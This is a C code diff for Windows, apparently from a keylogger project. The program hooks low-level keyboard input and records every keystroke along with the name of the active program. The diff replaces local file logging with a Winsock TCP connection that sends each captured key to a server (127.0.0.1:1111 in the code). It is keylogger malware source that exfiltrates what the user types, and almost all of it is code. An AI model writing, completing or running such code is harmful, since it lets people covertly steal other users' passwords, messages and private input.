@@ -8,9 +8,17 @@ const char* SPECIALS[SPECIALS_LENGTH] = { "[BACKSPACE]", "\n", " ", "[TAB]", "[S
 
 HHOOK hook;
 KBDLLHOOKSTRUCT kb_struct;
-FILE* file;
 char prev_prog_name[PROG_NAME_LENGTH];
 char curr_prog_name[PROG_NAME_LENGTH];
+
+WSADATA wsa_data;
+WORD dll_version = MAKEWORD(2, 1);
+
+SOCKADDR_IN addr;
+SOCKET connection;
+int sizeofaddr = sizeof(addr);
+
+const char RETURN[2] = {'\n' , '\0'};
 
 int find_key(int key) {
     for (int i = 0; i < SPECIALS_LENGTH; i++) {
@@ -18,8 +26,35 @@ int find_key(int key) {
             return i;
         }
     }
-
     return -1;
+}
+
+inline int connect_to_serv() {
+    if (WSAStartup(dll_version, &wsa_data) != 0) {
+        printf("Error, can`t start wsa");
+        exit(1);
+    }
+
+	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	addr.sin_port = htons(1111);
+	addr.sin_family = AF_INET;
+
+    connection = socket(AF_INET, SOCK_STREAM, NULL);
+    if (connect(connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
+        printf("Error, can't connect to server!\n");
+        return 1;
+    }
+
+    return 0;
+}
+
+void send_to_serv(int conn, char* msg) {
+    if (conn == 0) {
+        send(connection, msg, sizeof(msg), NULL);
+    }
+    else {
+        printf("Error in connection to server!\n");
+    }
 }
 
 int save(int key) {
@@ -31,8 +66,9 @@ int save(int key) {
     DWORD thread_id;
     HKL keyboard;
 
-
     if (foreground != NULL) {
+
+        char* prog_name[256];
 
         thread_id = GetWindowThreadProcessId(foreground, NULL);
         keyboard = GetKeyboardLayout(thread_id);
@@ -41,9 +77,9 @@ int save(int key) {
 
         if (strcmp(prev_prog_name, curr_prog_name) != 0) {
             strcpy_s(prev_prog_name, PROG_NAME_LENGTH, curr_prog_name);
-            fputs("\n--------Program: ", file);
-            fputs(curr_prog_name, file);
-            fputs("--------\n", file);
+            send_to_serv(connect_to_serv(), RETURN);
+            send_to_serv(connect_to_serv(), curr_prog_name);
+            send_to_serv(connect_to_serv(), RETURN);
         }
     }
     else {
@@ -54,14 +90,13 @@ int save(int key) {
 
     int i = find_key(key);
     if (i > 0) {
-        fputs(SPECIALS[i], file);
+        send_to_serv(connect_to_serv(), SPECIALS[i]);
     }
 
     char curr_key;
     curr_key = (char)MapVirtualKeyExW(key, MAPVK_VK_TO_CHAR, keyboard);
-    fputc(curr_key, file);
-
-    fflush(file);
+    char str[2] = {curr_key , '\0'};
+    send_to_serv(connect_to_serv(), str);
 
     return 0;
 }
